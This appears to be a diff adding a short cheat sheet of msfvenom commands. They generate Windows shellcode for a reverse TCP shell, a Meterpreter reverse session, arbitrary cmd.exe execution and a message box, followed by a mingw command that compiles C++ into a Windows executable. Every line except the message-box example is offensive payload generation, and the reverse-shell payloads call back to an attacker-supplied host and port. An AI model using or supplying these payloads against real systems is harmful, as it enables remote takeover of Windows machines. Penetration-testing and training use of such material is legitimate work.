@@ -1,0 +1,20 @@
+
+Windows Reverse TCP Shell en Shellcode:
+
+msfvenom -p windows/shell_reverse_tcp LHOST=your_IP LPORT=your_port -f c
+
+Windows Meterpreter Reverse TCP en Shellcode:
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=your_IP LPORT=your_port -f c
+
+CMD Windows Executable Shellcode:
+
+msfvenom -p windows/exec CMD=”cmd.exe /C your_command” -f c
+
+Windows Message Box Shellcode:
+
+msfvenom -p windows/messagebox TEXT=”Message” -f c
+
+Compiling c++ code:
+sudo x86_64-w64-mingw32-g++ -o output.exe file.cpp -static-libstdc++ -static-libgcc -fpermissive -fexceptions
+
